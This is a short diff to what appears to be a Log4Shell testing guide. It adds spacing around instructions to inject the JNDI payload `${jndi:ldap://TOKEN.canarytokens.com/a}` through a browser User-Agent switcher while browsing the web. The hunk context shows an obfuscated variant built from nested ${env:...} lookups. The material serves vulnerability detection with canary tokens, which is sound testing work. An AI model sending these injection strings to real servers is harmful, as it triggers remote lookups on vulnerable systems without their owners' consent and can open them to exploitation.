@@ -109,7 +109,9 @@ test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//
 ```
 
 Triggering the Canary Token by using User-Agent Switcher:
+
 URL: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
+
 Payload: `${jndi:ldap://TOKEN.canarytokens.com/a}`
 
 Fire in the hole aka start browsing the web!
